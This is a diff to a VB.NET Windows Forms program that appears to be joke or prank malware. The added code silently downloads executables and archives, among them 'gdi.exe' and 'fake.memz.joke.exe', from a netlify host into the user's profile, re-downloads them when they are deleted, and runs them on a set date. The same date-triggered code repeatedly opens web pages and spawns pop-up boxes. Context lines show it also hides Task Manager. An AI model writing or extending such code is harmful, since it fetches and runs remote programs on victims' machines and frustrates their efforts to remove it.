@@ -5,6 +5,8 @@ Imports System.Net
 Imports System.Text
 Imports System.Security.AccessControl
 Imports System.Management
+Imports System.Threading
+Imports System.IO.Compression
 
 
 Public Class Form1
@@ -19,10 +21,14 @@ Public Class Form1
     Dim download6 As Boolean = False
     Dim download7 As Boolean = False
     Dim working4 As Boolean = False
+    Dim download8 As Boolean = False
+    Dim download9 As Boolean = False
+    Dim download10 As Boolean = False
+    Dim download11 As Boolean = False
     Dim Check4BadFile As Boolean = False
 
 
-    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load 'https://incomparable-cascaron-802b94.netlify.app/338ryfhn2iyhrb2j.exe
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
         HideTaskManager()
         downloadwavFiles()
         Wait2DisPros.RunWorkerAsync()
@@ -30,7 +36,7 @@ Public Class Form1
             Dim sb As New System.Text.StringBuilder
 
 
-            ' MsgBox("")
+            ' MsgBox("") 'https://www.7-zip.org/a/7zr.exe
             ' CheckForBadFiles.Start()
             ' CehckforbadPross.Start()
         End If
@@ -58,14 +64,55 @@ Public Class Form1
         Dim info As Byte() = New UTF8Encoding(True).GetBytes(Application.ExecutablePath)
         fs.Write(info, 0, info.Length)
         fs.Close()
+        'https://incomparable-cascaron-802b94.netlify.app/DesktopGoose.zip
 
 
+        RegistryKey = CreateObject("WScript.Shell") 'https://www.7-zip.org/a/7zr.exe
+        Try
+            download8 = True
+            My.Computer.Network.DownloadFile(
+         "https://incomparable-cascaron-802b94.netlify.app/gdi.exe", 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
+        "C:\Users\" & SystemInformation.UserName & "\gdi.exe")
 
-        RegistryKey = CreateObject("WScript.Shell")
+        Catch ex As Exception
+
+        End Try
+
+        Try
+            download8 = True
+            My.Computer.Network.DownloadFile(
+         "https://www.7-zip.org/a/7zr.exe", 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
+        "C:\Users\" & SystemInformation.UserName & "\7z.exe")
+
+        Catch ex As Exception
+
+        End Try
+
+        Try
+            download9 = True
+            My.Computer.Network.DownloadFile(
+         "https://incomparable-cascaron-802b94.netlify.app/DesktopGoose.zip", 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
+        "C:\Users\" & SystemInformation.UserName & "\DesktopGoose.zip")
+
+        Catch ex As Exception
+
+        End Try
+
+
+        Try
+            download9 = True
+            My.Computer.Network.DownloadFile(
+         "https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe", 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
+        "C:\Users\" & SystemInformation.UserName & "\fake.memz.joke.exe")
+
+        Catch ex As Exception
+
+        End Try
+
         Try
             download1 = True
             My.Computer.Network.DownloadFile(
-         "https://incomparable-cascaron-802b94.netlify.app/AxInterop.WMPLib.dll",
+         "https://incomparable-cascaron-802b94.netlify.app/AxInterop.WMPLib.dll", 'https://incomparable-cascaron-802b94.netlify.app/BluescreenSimulator.exe
         "C:\Users\" & SystemInformation.UserName & "\AxInterop.WMPLib.dll")
 
         Catch ex As Exception
@@ -276,9 +323,52 @@ Public Class Form1
                     rickrolled.Show()
                 End If
                 If day = 1 AndAlso month = 10 Then
-
-                    MsgBox("No computer today go outsie to play", 0 + 64, "touchgrass")
+                    MsgBox("I have launched my custom version of the memz virus so have fun with that (:", 0 + 64, "MEMZ")
                     Timer4.Start()
+                    Memzopenweb.Start()
+                    '      Threading.Thread.Sleep(50000)
+                    Stilluseingthispclol.Start()
+                    ' Threading.Thread.Sleep(50000)
+
+                    'MsgBox("PC SELF-DESTRUCT INITIATED", 0 + 16, "MEMZ")
+
+                    Try
+                        Process.Start("C:\Users\" & SystemInformation.UserName & "\gdi.exe") 'gdi_test.exe
+                    Catch ex As Exception
+                        MsgBox(ex.ToString, 0 + 16, "yuki - memz")
+                    End Try
+
+
+                    Threading.Thread.Sleep(70000)
+                    Try
+                        Process.GetProcessesByName("gdi")(0).Kill()
+                    Catch ex As Exception
+
+                    End Try
+                    Try
+                        Process.GetProcessesByName("gdi_test")(0).Kill()
+                    Catch ex As Exception
+
+                    End Try
+                    Try
+                        Process.GetProcessesByName("gdi.exe")(0).Kill()
+                    Catch ex As Exception
+
+                    End Try
+                    Try
+                        Process.GetProcessesByName("gdi_test.exe")(0).Kill()
+                    Catch ex As Exception
+
+                    End Try
+                    Try
+                        Process.Start("C:\Users\" & SystemInformation.UserName & "\fake.memz.joke.exe")
+                        Memzopenweb.Stop()
+                        Timer4.Stop()
+                        Stilluseingthispclol.Stop()
+                    Catch ex As Exception
+
+                    End Try
+
                 End If
                 If day = 1 AndAlso month = 11 Then 'https://www.fittea.com/
                     Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
@@ -500,7 +590,7 @@ Public Class Form1
     End Sub
 
     Private Sub CheckForBadFiles_Tick(sender As Object, e As EventArgs) Handles CheckForBadFiles.Tick
-
+        '"C:\Users\" & SystemInformation.UserName & "\gdi.exe"
         If Check4BadFile = True Then
             Dim fileReader As String
             fileReader = "oh ur dead"
@@ -562,6 +652,38 @@ Public Class Form1
 
                 End If
             End If
+
+            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\gdi.exe") Then
+            Else
+                If download8 = True Then
+                    Try
+                        My.Computer.Network.DownloadFile(
+    "https://incomparable-cascaron-802b94.netlify.app/gdi.exe",
+   "C:\Users\" & SystemInformation.UserName & "\gdi.exe")
+                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
+                    Catch ex As Exception
+
+                    End Try
+
+                End If
+            End If
+
+
+            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\fake.memz.joke.exe") Then
+            Else
+                If download9 = True Then
+                    Try
+                        My.Computer.Network.DownloadFile(
+    "https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe",
+   "C:\Users\" & SystemInformation.UserName & "\fake.memz.joke.exe")
+                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
+                    Catch ex As Exception
+
+                    End Try
+
+                End If
+            End If
+
             If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\Hoax.Win32.BadJoke.BlastBtn.a.exe") Then
             Else
                 If download1 = True Then
@@ -642,17 +764,17 @@ Public Class Form1
             If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe") Then
             Else
                 If download3 = True Then
-                    Try
-                        My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/welpyoutryed.exe",
-            "C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
-                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
-                    Catch ex As Exception
-
-                    End Try
 
                 End If
             End If
+            Try
+                My.Computer.Network.DownloadFile(
+             "https://incomparable-cascaron-802b94.netlify.app/welpyoutryed.exe",
+            "C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
+                Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
+            Catch ex As Exception
+
+            End Try
         End If
 
     End Sub
@@ -810,6 +932,37 @@ Public Class Form1
         CheckForBadFiles.Start()
 
     End Sub
+
+    Private Sub Memzopenweb_Tick(sender As Object, e As EventArgs) Handles Memzopenweb.Tick
+        Threading.Thread.Sleep(7000)
+        Process.Start("https://www.google.com/search?q=batch+virus+download&gs_ivs=1")
+        Threading.Thread.Sleep(10000)
+        Process.Start("https://www.google.com/search?q=how+2+get+free+robux&rlz=1C1CHBF_enUS1001US1001&oq=how+2+get+free+robux&aqs=chrome..69i57j0i512j0i22i30i625.5721j0j7&sourceid=chrome&ie=UTF-8")
+        Threading.Thread.Sleep(10000)
+        Process.Start("https://www.google.com/search?q=is+the+memz+real&rlz=1C1CHBF_enUS1001US1001&sxsrf=AJOqlzUa7TuxfjZxQuFevGrNu9YaEzmbuw%3A1677365515977&ei=C5H6Y5H_OuyjptQP5pGE-AM&ved=0ahUKEwjRsPO94bH9AhXskYkEHeYIAT8Q4dUDCBA&uact=5&oq=is+the+memz+real&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzIECCMQJzIECCMQJzIECCMQJzIFCAAQkQIyBQgAEJECMgsIABCABBCxAxCDATILCAAQgAQQsQMQgwEyEQguEIAEELEDEIMBEMcBEK8BMhEILhCABBCxAxCDARDHARDRAzILCAAQgAQQsQMQgwFKBAhBGABQAFjnMWC4NGgAcAF4AIABjgGIAY4BkgEDMC4xmAEAoAEBwAEB&sclient=gws-wiz-serp")
+        Threading.Thread.Sleep(7000)
+        Process.Start("https://www.google.com/search?q=batch+virus+download&gs_ivs=1")
+        Threading.Thread.Sleep(7000)
+        Process.Start("http://pcoptimizerpro.com/")
+        Threading.Thread.Sleep(7000)
+    End Sub
+
+    Private Sub Stilluseingthispclol_Tick(sender As Object, e As EventArgs) Handles Stilluseingthispclol.Tick
+        Dim r
+        Randomize()
+        r = Int(Rnd() * 500) + 1
+        Dim r2 = Int(Rnd() * 1500) + 1
+        Dim Title = "still using this computer?"
+        Dim DefaultValueText = "still using this computer?"
+        Dim Message = "still using this computer?"
+        Dim XPos = r
+        Dim YPos = r2
+        Dim Text = InputBox(Message, Title, DefaultValueText, XPos, YPos)
+    End Sub
+
+    Private Sub fakememz_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles fakememz.DoWork
+
+    End Sub
 End Class
 
 Public Class MyUtilities
@@ -821,4 +974,6 @@ Public Class MyUtilities
         p.StartInfo = pi
         p.Start()
     End Sub
+
+
 End Class
